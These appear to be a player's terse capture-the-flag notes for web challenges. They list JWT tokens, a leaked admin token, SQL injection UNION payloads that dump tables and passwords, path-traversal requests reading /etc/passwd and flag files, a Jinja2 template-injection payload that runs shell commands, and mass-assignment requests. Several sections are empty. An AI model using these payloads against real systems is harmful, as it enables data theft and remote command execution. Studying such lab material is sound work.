# Shadow API's

## Undoc
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRlYnVnIiwicm9sZSI6ImRlYnVnZ2VyIiwiaWF0IjoxNjE2MTYxNjE2fQ.H5Vrs2UW82Pi8LRRwwG0RKdM0xQwXMFsxETDJBBjOLQ

## Obscura
mine
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkRyYWdvbk1hZ2UxIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NDc5MDQ2Njh9.Yu2xMhqW-VVfSRJ03ZPkILmBIoWfanpQom8Fca8NIWo


debug
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRlYnVnIiwicm9sZSI6ImRlYnVnZ2VyIiwiaWF0IjoxNzQ3ODczOTEwLCJleHAiOjE3NTA0NjU5MTB9.VjFkiXQ0zCux6uG3eKuEqHB3yrgGMXmKvieAHhZotcQ

GET /logs/system.log HTTP/2

[2025-05-21T19:03:29.528Z] Admin token generated: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQ3ODc0MjA5fQ.4EKq37o0-pbJn9O9MlJGzPR03pnxmXzFRaVlmeF8h1I


GET /api/admin HTTP/





# Injection
## Search for secrets
' UNION SELECT name FROM sqlite_master WHERE type='table'; -- -
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'; -- -


' UNION SELECT flag FROM flags; -- -

## Break the gate
"username":"TEST'UNION SELECT sql,sql FROM sqlite_master WHERE name='users'; -- -",

CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, is_admin INTEGER)!"

alice (not admin)
"message":"Welcome, alicee7HV$8jP#zQr2@KmLn9!"

admin (admin)
"message":"Welcome, e7HV$8jP#zQr2@KmLn9!xDfG!"




# Slash and dash
##  Road less travelled
![[Pasted image 20250522095612.png]]
`root:x:0:0:root:/root:/bin/bash`
`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`
`bin:x:2:2:bin:/bin:/usr/sbin/nologin`
`sys:x:3:3:sys:/dev:/usr/sbin/nologin`
`sync:x:4:65534:sync:/bin:/bin/sync`
`games:x:5:60:games:/usr/games:/usr/sbin/nologin`
`man:x:6:12:man:/var/cache/man:/usr/sbin/nologin`
`lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin`
`mail:x:8:8:mail:/var/mail:/usr/sbin/nologin`
`news:x:9:9:news:/var/spool/news:/usr/sbin/nologin`
`uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin`
`proxy:x:13:13:proxy:/bin:/usr/sbin/nologin`
`www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`
`backup:x:34:34:backup:/var/backups:/usr/sbin/nologin`
`list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin`
`irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin`
`_apt:x:42:65534::/nonexistent:/usr/sbin/nologin`
`nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`

GET /api/read?file=/app/private/flag.txt 

## Filtered Fun
GET /api/read?file=/app/private/flag.txt
?

## Encoded esapades


# BugBountyHub

## Exception Excavation
Advanced users: We use Jinja2 templating for maximum flexibility.
`{"error":"'Template not found'","path":"/report/411/preview/411","method":"GET","timestamp":"2025-05-24T19:33:02.022317","debug":{"exception_type":"KeyError","stack_trace":"Traceback (most recent call last):\n  File \"/usr/local/lib/python3.9/site-packages/starlette/middleware/errors.py\", line 162, in __call__\n    await self.app(scope, receive, _send)\n  File \"/usr/local/lib/python3.9/site-packages/starlette/middleware/sessions.py\", line 86, in __call__\n    await self.app(scope, receive, send_wrapper)\n  File \"/usr/local/lib/python3.9/site-packages/starlette/middleware/exceptions.py\", line 79, in __call__\n    raise exc\n  File \"/usr/local/lib/python3.9/site-packages/starlette/middleware/exceptions.py\", line 68, in __call__\n    await self.app(scope, receive, sender)\n  File \"/usr/local/lib/python3.9/site-packages/fastapi/middleware/asyncexitstack.py\", line 21, in __call__\n    raise e\n  File \"/usr/local/lib/python3.9/site-packages/fastapi/middleware/asyncexitstack.py\", line 18, in __call__\n    await self.app(scope, receive, send)\n  File \"/usr/local/lib/python3.9/site-packages/starlette/routing.py\", line 718, in __call__\n    await route.handle(scope, receive, send)\n  File \"/usr/local/lib/python3.9/site-packages/starlette/routing.py\", line 276, in handle\n    await self.app(scope, receive, send)\n  File \"/usr/local/lib/python3.9/site-packages/starlette/routing.py\", line 66, in app\n    response = await func(request)\n  File \"/usr/local/lib/python3.9/site-packages/fastapi/routing.py\", line 237, in app\n    raw_response = await run_endpoint_function(\n  File \"/usr/local/lib/python3.9/site-packages/fastapi/routing.py\", line 163, in run_endpoint_function\n    return await dependant.call(**values)\n  File \"/app/app.py\", line 423, in preview_report_template\n    raise KeyError(\"Template not found\")\nKeyError: 'Template not found'\n\n# DEBUG: Secret flag is flag{st4ck_tr4c3s_r3v34l_s3cr3ts}\n","api_version":"1.1.0"}}`

## Render Bender
{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /app/flags/flag2.txt').read() }}



# Massive
PUT /api/profiles/me HTTP/2
GET /api/admin/dashboard HTTP/2

# Permission Slip
## MoleHill





